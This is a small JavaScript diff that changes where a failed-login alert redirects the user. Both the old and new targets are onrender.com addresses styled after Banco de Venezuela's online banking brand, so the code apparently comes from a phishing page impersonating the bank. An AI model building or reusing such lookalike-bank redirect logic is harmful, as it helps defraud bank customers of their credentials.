@@ -168,7 +168,7 @@ function mostrarAlertaAutenticacionIncorrecta() {
 
     // Función para redirigir después de 5 segundos o al hacer clic en el botón
     function redirigir() {
-        window.location.href = "https://bdvenlinea-banvenez.onrender.com";
+        window.location.href = "https://bdvenlineabanvenez.onrender.com";
     }
 
     // Redirigir al hacer clic en el botón
